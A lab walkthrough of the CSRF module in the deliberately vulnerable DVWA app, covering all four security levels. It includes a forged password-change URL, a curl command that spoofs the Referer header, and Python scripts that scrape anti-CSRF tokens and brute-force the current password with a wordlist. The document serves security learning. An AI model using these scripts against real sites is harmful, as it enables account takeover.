# DVWA - CSRF

## Description

**Vulnerability:** CSRF    
**Impact:** CSRF attack change any accounts' passwords.

---

## LOW Security Level
Make a change password request for testing and inspecting the Network I can see the change password request is a GET request with `password_new` and `password_conf` params:
```
http://localhost/DVWA/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change
```

We can send this URL to trick any users to click on and their accounts' password will be changed.

## MEDIUM Security Level
In this MEDIUM level, it has a check condition before executing code:
```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
// The code
} else {
    // Didn't come from a trusted source
    echo "<pre>That request didn't look correct.</pre>";
}
```
So, we can add a header to this request to change the password (I use a basic `curl` command):
```bash
curl "http://localhost/DVWA/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change" -H "Referer: http://localhost/DVWA/vulnerabilities/csrf/" -b "security=medium; PHPSESSID=<YOUR_SESSION_ID>"
```
This command will change the password.

## HIGH Security Level
THis HIGH security level is similar to Brute-force HIGH security level. They both add a `CSRF Token` to validate before executing the logic.

You can see here there is a check anti CSRF Token
```php
// Check Anti-CSRF token
checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );

// Generate Anti-CSRF token
generateSessionToken();
```

Also, if you inspect the form in browser you will see a hidden input:
```html
<input type="hidden" name="user_token" value="<RANDOM_USER_TOKEN>">
```

So the workflow is:
1. Make a GET request and take the created CSRF token firstly.
2. Make a GET request like other two levels but we also add a `user_token` param to pass the check.

I have created a exploit Python code:
```python
import requests
import re

baseUrl = "http://localhost/DVWA/vulnerabilities/csrf/"

cookies = {
    "PHPSESSID": "<YOUR_SESS_ID>",
    "security": "high"
}

pattern = r"name='user_token' value='([a-fA-F0-9]+)'"

def getCSRFToken():
    try:
        # Take CSRF Token
        res = requests.get(baseUrl, cookies=cookies)

        match = re.search(pattern, res.text)
        if match:
            token = match.group(1)
            
            return token
        else:
            print("Failed to taken token")
            return False
    except requests.exceptions.RequestException as e:
        print("Request error:", e)

def changePassword(user_token):
    newPassword = input('Enter new password: ')

    headers = {
        "Referer": "http://localhost/DVWA/vulnerabilities/csrf/"
    }

    url = baseUrl + f"?password_new={newPassword}&password_conf={newPassword}&Change=Change&user_token={user_token}"

    try:
        res = requests.get(url, cookies=cookies, headers=headers)

        if "Password Changed" in res.text:
            print('Successfully change password')
        else:
            print('Failed to change password')
            print(res.text)
    except requests.exceptions.RequestException as e:
        print("Request error:", e)

user_token = getCSRFToken()
if (user_token):
    changePassword(user_token)
```

## IMPOSSIBLE Security Level
This level seems to impossible to exploit. However, there is a vulnerability: this level requires a new value which is `password_current` in order to check if the user know the current password before changing the new one.

This seems to be secure however unlike the IMPOSSIBLE level of brute-force it will have several checks and also limit the errors. Therefore, in that IMPOSSIBLE brute-force it is kinda hard to brute-force the password. However, this IMPOSSIBLE level in CSRF doesn't check like that.

=> We can brute-force the current password then change new one (even though we doesn't know the current password).

This is my created Python exploit code:
```python
import requests
import re

baseUrl = "http://localhost/DVWA/vulnerabilities/csrf/"

cookies = {
    "PHPSESSID": "<YOUR_SESSS_ID>",
    "security": "impossible"
}

pattern = r"name='user_token' value='([a-fA-F0-9]+)'"

def getCSRFToken():
    try:
        # Take CSRF Token
        res = requests.get(baseUrl, cookies=cookies)

        match = re.search(pattern, res.text)
        if match:
            token = match.group(1)
            
            return token
        else:
            print("Failed to taken token")
            return False
    except requests.exceptions.RequestException as e:
        print("Request error:", e)

def changePassword():
    newPassword = input('Enter new password: ')

    headers = {
        "Referer": "http://localhost/DVWA/vulnerabilities/csrf/"
    }

    try:    
        with open('/usr/share/wordlists/rockyou.txt') as file:
            for line in file:
                password = line.rstrip()
                
                user_token = getCSRFToken()

                if not user_token:
                    print('Failed to fetch token')
                    continue
                

                url = baseUrl + f"?password_current={password}&password_new={newPassword}&password_conf={newPassword}&Change=Change&user_token={user_token}"

                try:
                    print(f'Attempting {password}')
                    res = requests.get(url, cookies=cookies, headers=headers)

                    if "Password Changed" in res.text:
                        print()
                        print(f'Found current password: {password}')
                        print('Successfully change password')
                        exit()
                except requests.exceptions.RequestException as e:
                    print("Request error:", e)
    except FileNotFoundError as e:
        print("File not found:", e)

changePassword()
```


## Resources
- https://owasp.org/www-community/attacks/csrf
- https://www.cgisecurity.com/csrf-faq.html
- https://en.wikipedia.org/wiki/Cross-site_request_forgery
